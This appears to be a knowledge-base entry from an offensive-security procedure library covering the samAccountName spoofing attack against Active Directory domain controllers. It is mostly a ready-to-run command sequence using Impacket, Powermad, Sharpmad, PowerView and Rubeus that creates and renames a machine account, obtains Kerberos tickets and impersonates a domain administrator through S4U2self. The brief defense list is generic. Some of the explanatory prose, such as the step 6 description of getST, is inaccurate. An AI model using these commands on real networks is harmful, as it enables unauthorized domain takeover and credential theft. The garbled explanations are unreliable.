---
id: 1d95c59a-46fe-4c17-91fa-b168b03bdb15
name: samAccountName Spoofing Attack
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:03.119838+00:00'
updated_at: '2023-04-10T20:26:11.529335+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Discovery|TA0007 - Discovery]]'
techniques:
- '[[Credential Dumping|T1003 - Credential Dumping]]'
- '[[Domain Trust Discovery|T1482 - Domain Trust Discovery]]'
- '[[Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos Tickets]]'
sub_techniques:
- '[[Kerberoasting|T1558.003 - Kerberoasting]]'
tags:
- '[[Active Directory Attacks]]'
- '[[From CVE to SYSTEM shell on DC]]'
- '[[samAccountName spoofing]]'
commands:
- '[[Add Computer to Domain]]'
- '[[Add SPN to ControlledComputer]]'
- '[[Clear SPN from ControlledComputer]]'
- '[[Create New Machine Account]]'
- '[[Create New Machine Account with Sharpmad]]'
- '[[Get Service Ticket (ST) for cifs/DomainController.domain.local]]'
- '[[Get TGT using Impacket]]'
- '[[Get TGT using Rubeus]]'
- '[[Impersonate user DomainAdmin using Rubeus]]'
- '[[Rename machine]]'
- '[[Rename Machine]]'
- '[[Set machine account attribute]]'
- '[[Set Machine Account Attribute]]'
---

# samAccountName Spoofing Attack

## Summary

The samAccountName spoofing attack is a technique used to gain access to a domain controller (DC) by spoofing the samAccountName attribute of a computer account. This attack involves creating a new computer account with a name that is similar to the DC's name, then requesting a TGT and a service ti

## Description

# Description

The samAccountName spoofing attack is a technique used to gain access to a domain controller (DC) by spoofing the samAccountName attribute of a computer account. This attack involves creating a new computer account with a name that is similar to the DC's name, then requesting a TGT and a service ticket for that account. Once the attacker has obtained these tickets, they can use them to access the DC and gain SYSTEM-level privileges. This attack is often used in conjunction with other Active Directory attacks to escalate privileges and move laterally within the network.

From a technical perspective, this attack exploits a weakness in the way that Kerberos authentication is implemented in Active Directory. By spoofing the samAccountName attribute of a computer account, an attacker can trick the DC into thinking that they are a legitimate computer on the network. This allows them to obtain Kerberos tickets that can be used to access other resources on the network.

From a business perspective, this attack can have serious consequences. If an attacker gains access to a DC, they can potentially access sensitive data, install malware, and cause significant damage to the organization.

## Requirements

1. Valid domain credentials

1. Access to a computer on the network

1. Tools for creating and manipulating computer accounts (e.g. PowerShell)

## Defense

1. Implement strong password policies and multi-factor authentication to prevent credential theft

1. Monitor for anomalous activity, such as requests for TGTs and service tickets from unusual accounts

1. Limit the number of domain controllers that are accessible from the internet or other untrusted networks

## Objectives

1. Gain access to a domain controller

1. Escalate privileges to SYSTEM-level

1. Move laterally within the network

# Instructions

1. To create a new computer account, follow the below instructions:

1. Open the command prompt or PowerShell on your system.
2. Run the command 'addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword'' in the command prompt or PowerShell. This will add a new computer account to the specified domain.
3. Alternatively, you can use PowerShell to create a new computer account. Run the command '. .\Powermad.ps1' to load the Powermad PowerShell module. Then, run the command 'New-MachineAccount -MachineAccount "ControlledComputer" -Password $($password) -Domain "domain.local" -DomainController "DomainController.domain.local" -Verbose'. This will create a new machine account on the specified domain controller.
4. If you prefer to use Sharpmad, run the command 'Sharpmad.exe MAQ -Action new -MachineAccount ControlledComputer -MachinePassword ComputerPassword' in the command prompt or PowerShell.

**Code**: [[impacket@linux> addcomputer.py -computer-name 'Con]]

> The 'addcomputer.py' command is used to add a new computer account to a domain. The '-computer-name' option specifies the name of the new computer account, '-computer-pass' specifies the password for the new account, '-dc-host' specifies the hostname of the domain controller, and '-domain-netbios' specifies the NetBIOS name of the domain. The 'domain.local/user1:complexpassword' argument specifies the domain and the credentials to use for the operation.

The 'New-MachineAccount' command is used to create a new machine account on the specified domain controller. The '-MachineAccount' option specifies the name of the new machine account, '-Password' specifies the password for the new account, '-Domain' specifies the domain name, and '-DomainController' specifies the hostname of the domain controller.

The 'Sharpmad.exe' command is used to create a new machine account on the specified domain. The 'MAQ' argument specifies that a new machine account is being created, '-Action' specifies the action to perform, '-MachineAccount' specifies the name of the new machine account, and '-MachinePassword' specifies the password for the new account.

**Command** ([[Add Computer to Domain]]):

```bash
impacket@linux> addcomputer.py -computer-name 'ControlledComputer$' -computer-pass 'ComputerPassword' -dc-host DC01 -domain-netbios domain 'domain.local/user1:complexpassword'
```

**Command** ([[Create New Machine Account]]):

```bash
powermad@windows> . .\Powermad.ps1
powermad@windows> $password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText -Force
powermad@windows> New-MachineAccount -MachineAccount "ControlledComputer" -Password $($password) -Domain "domain.local" -DomainController "DomainController.domain.local" -Verbose
```

**Command** ([[Create New Machine Account with Sharpmad]]):

```bash
sharpmad@windows> Sharpmad.exe MAQ -Action new -MachineAccount ControlledComputer -MachinePassword ComputerPassword
```

2. To clear the servicePrincipalName attribute for a controlled machine account, follow these steps:

**Code**: [[impacket@linux> addspn.py -u 'domain\user' -p 'pas]]

> 1. Run the `addspn.py` command with the appropriate parameters to add a new service principal name for the machine account on the domain controller.
2. Load the `Powerview.ps1` script in PowerShell.
3. Run the `Set-DomainObject` command with the distinguished name of the controlled machine account and the `-Clear` parameter with the value of 'serviceprincipalname' to clear the attribute.
4. Use the `-Verbose` parameter to display the operation progress.

**Command** ([[Add SPN to ControlledComputer]]):

```bash
impacket@linux> addspn.py -u 'domain\user' -p 'password' -t 'ControlledComputer$' -c DomainController
```

**Command** ([[Clear SPN from ControlledComputer]]):

```powershell
powershell@windows> . .\Powerview.ps1
powershell@windows> Set-DomainObject "CN=ControlledComputer,CN=Computers,DC=domain,DC=local" -Clear 'serviceprincipalname' -Verbose
```

3. Use the `renameMachine.py` script on a Linux machine or the `Set-MachineAccountAttribute` cmdlet on a Windows machine to rename the machine account to the name of a Domain Controller without the trailing `$`. The `-current-name` option should be set to the current name of the machine account, including the trailing `$`. The `-new-name` option should be set to the desired name of the machine account, without the trailing `$`. The `-dc-ip` option should be set to the IP address of the Domain Controller. The `domain.local/user:password` argument should be replaced with valid credentials for a user with permissions to rename the machine account.

**Code**: [[# https://github.com/SecureAuthCorp/impacket/pull/]]

> This command is used to rename a machine account to the name of a Domain Controller without the trailing `$`. This is useful for attackers trying to blend in with legitimate Domain Controllers and avoid detection. The `renameMachine.py` script is part of the Impacket library, which is a collection of Python classes for working with network protocols. The `Set-MachineAccountAttribute` cmdlet is part of the Powermad PowerShell module, which is a collection of PowerShell cmdlets for working with Active Directory. The `-Verbose` option in the PowerShell command is used to display detailed output.

**Command** ([[Rename machine]]):

```bash
impacket@linux> renameMachine.py -current-name 'ControlledComputer$' -new-name 'DomainController' -dc-ip 'DomainController.domain.local' 'domain.local'/'user':'password'
```

**Command** ([[Set machine account attribute]]):

```bash
powermad@windows> Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "DomainController" -Attribute samaccountname -Verbose
```

4. To request a TGT for the controlled machine account, use the following commands:

For Linux:
getTGT.py -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController':'ComputerPassword'

For Windows:
Rubeus.exe asktgt /user:"DomainController" /password:"ComputerPassword" /domain:"domain.local" /dc:"DomainController.domain.local" /nowrap

**Code**: [[impacket@linux> getTGT.py -dc-ip 'DomainController]]

> This command is used to request a TGT (Ticket Granting Ticket) for the controlled machine account. A TGT is a form of authentication that allows a user or machine to authenticate to a Kerberos domain controller and obtain a service ticket for a specific resource on the network. The TGT is obtained by providing the domain name, domain controller name, and the password for the computer account. This command is useful for lateral movement and privilege escalation within a network.

**Command** ([[Get TGT using Impacket]]):

```bash
getTGT.py -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController':'ComputerPassword'
```

**Command** ([[Get TGT using Rubeus]]):

```bash
Rubeus.exe asktgt /user:"DomainController" /password:"ComputerPassword" /domain:"domain.local" /dc:"DomainController.domain.local" /nowrap
```

5. To reset the sAMAccountName of a controlled machine account to its old value, follow these steps:

1. On a Linux machine, run the following command:
renameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password'
This will rename the machine account to its old value.

2. On a Windows machine, run the following command:
Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "ControlledComputer" -Attribute samaccountname -Verbose
This will reset the sAMAccountName of the machine account to its old value.

**Code**: [[impacket@linux> renameMachine.py -current-name 'Do]]

> The 'renameMachine.py' command is used to rename a machine account on a Linux machine. The '-current-name' option is used to specify the current name of the machine account, and the '-new-name' option is used to specify the new name of the machine account. The 'domain.local'/'user':'password' argument is used to specify the domain, username, and password for the domain administrator.

The 'Set-MachineAccountAttribute' command is used to reset the sAMAccountName of a machine account on a Windows machine. The '-MachineAccount' option is used to specify the name of the machine account, and the '-Value' option is used to specify the new value for the sAMAccountName. The '-Attribute' option is used to specify the attribute to modify, which in this case is 'samaccountname'. The '-Verbose' option is used to provide detailed output about the command's execution.

**Command** ([[Rename Machine]]):

```bash
impacket@linux> renameMachine.py -current-name 'DomainController' -new-name 'ControlledComputer$' 'domain.local'/'user':'password'
```

**Command** ([[Set Machine Account Attribute]]):

```bash
powermad@windows> Set-MachineAccountAttribute -MachineAccount "ControlledComputer" -Value "ControlledComputer" -Attribute samaccountname -Verbose
```

6. Use the following steps to request a service ticket with S4U2self:
1. Run the command `KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -spn 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController'` on Linux.
2. Run the command `Rubeus.exe s4u /self /impersonateuser:"DomainAdmin" /altservice:"ldap/DomainController.domain.local" /dc:"DomainController.domain.local" /ptt /ticket:[Base64 TGT]` on Windows.

**Code**: [[# https://github.com/SecureAuthCorp/impacket/pull/]]

> This command is used to request a service ticket with S4U2self. The first step is to run the `getST.py` command on Linux to obtain a TGT. The obtained TGT is then used to run the `Rubeus.exe` command on Windows to request a service ticket with S4U2self. The `impacket` tool is used to obtain the TGT on Linux, while the `Rubeus.exe` tool is used to request the service ticket on Windows. The `-self` flag in the `getST.py` command specifies that the service ticket should be requested for the current user, while the `/self` flag in the `Rubeus.exe` command specifies the same for the Windows command. The `impersonateuser` flag specifies the user to impersonate, while the `altservice` flag specifies the service to request the ticket for. The `/ptt` flag tells Rubeus to inject the ticket into the current user's session. The `Base64 TGT` is the TGT obtained from the Linux command, which is then Base64 encoded and passed to the `/ticket` flag in the Windows command.

**Command** ([[Get Service Ticket (ST) for cifs/DomainController.domain.local]]):

```bash
KRB5CCNAME='DomainController.ccache' getST.py -self -impersonate 'DomainAdmin' -spn 'cifs/DomainController.domain.local' -k -no-pass -dc-ip 'DomainController.domain.local' 'domain.local'/'DomainController'
```

**Command** ([[Impersonate user DomainAdmin using Rubeus]]):

```bash
Rubeus.exe s4u /self /impersonateuser:"DomainAdmin" /altservice:"ldap/DomainController.domain.local" /dc:"DomainController.domain.local" /ptt /ticket:[Base64 TGT]
```

## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Discovery|TA0007 - Discovery]]

### Techniques

- [[Credential Dumping|T1003 - Credential Dumping]]
- [[Domain Trust Discovery|T1482 - Domain Trust Discovery]]
- [[Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos Tickets]]

### Sub-Techniques

- [[Kerberoasting|T1558.003 - Kerberoasting]]

## Commands Used

- [[Add Computer to Domain]]
- [[Add SPN to ControlledComputer]]
- [[Clear SPN from ControlledComputer]]
- [[Create New Machine Account]]
- [[Create New Machine Account with Sharpmad]]
- [[Get Service Ticket (ST) for cifs/DomainController.domain.local]]
- [[Get TGT using Impacket]]
- [[Get TGT using Rubeus]]
- [[Impersonate user DomainAdmin using Rubeus]]
- [[Rename machine]]
- [[Rename Machine]]
- [[Set machine account attribute]]
- [[Set Machine Account Attribute]]

## Tags

- [[Active Directory Attacks]]
- [[From CVE to SYSTEM shell on DC]]
- [[samAccountName spoofing]]
